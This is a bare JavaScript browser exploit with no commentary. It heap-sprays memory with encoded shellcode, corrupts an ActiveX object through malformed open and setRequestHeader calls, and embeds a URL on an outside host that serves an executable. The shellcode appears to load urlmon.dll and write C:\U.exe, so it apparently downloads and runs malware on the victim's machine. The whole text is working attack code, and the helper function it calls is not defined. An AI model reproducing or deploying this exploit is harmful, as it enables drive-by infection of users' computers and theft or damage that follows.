

var url = http://www.complex-programming.biz/st/exe/sysvx.exe?spl=fi;
var outValue = '';

var obj = null;

function exploit() {
obj = document.getElementById('target').object;

try {
obj.open(new Array(),new Array(),new Array(),new Array(),new Array());
} catch(e) {};

for (i = 0; i < url.length; )
{
outValue += '%u' + ((i+1<url.length)?url.charCodeAt(i+1).toString(16):'00')+url.charCodeAt(i).toString(16);
i = i + 2;
}


lipage = unescape(outValue);

var heapSprayToAddress = 0x05050505;
var payLoadCode = unescape("%u4343%u4343%u54EB%u758B%u8B3C%u3574%u0378"+
                     "%u56F5%u768B%u0320%u33F5%u49C9%uAD41%uDB33"+
                     "%u0F36%u14BE%u3828%u74F2%uC108%u0DCB%uDA03"+
                     "%uEB40%u3BEF%u75DF%u5EE7%u5E8B%u0324%u66DD"+"%u0C8B%u8B4B%u1C5E%uDD03%u048B%u038B%uC3C5"+
                     "%u7275%u6D6C%u6E6F%u642E%u6C6C%u4300%u5C3A"+
                     "%u2e55%u7865%u0065%uC033%u0364%u3040%u0C78"+"%u408B%u8B0C%u1C70%u8BAD%u0840%u09EB%u408B"+
                     "%u8D34%u7C40%u408B%u953C%u8EBF%u0E4E%uE8EC"+
                     "%uFF84%uFFFF%uEC83%u8304%u242C%uFF3C%u95D0"+"%uBF50%u1A36%u702F%u6FE8%uFFFF%u8BFF%u2454"+
                     "%u8DFC%uBA52%uDB33%u5353%uEB52%u5324%uD0FF"+
                     "%uBF5D%uFE98%u0E8A%u53E8%uFFFF%u83FF%u04EC"+"%u2C83%u6224%uD0FF%u7EBF%uE2D8%uE873%uFF40"+
                     "%uFFFF%uFF52%uE8D0%uFFD7%uFFFF");
                     

payLoadCode = payLoadCode +  lipage;

var heapBlockSize = 0x400000;
var payLoadSize = payLoadCode.length * 2;
var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
var spraySlide = unescape("%u0505%u0505");

spraySlide = getSpraySlide(spraySlide,spraySlideSize);
heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
memory = new Array();

for (i=0;i<heapBlocks;i++)
	{
		memory[i] = spraySlide + payLoadCode;
	}

obj.open(new Object(),new Object(),new Object(),new Object(), new Object());
obj.setRequestHeader(new Object(),'......');
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
obj.setRequestHeader(new Object(),0x12345678);
}

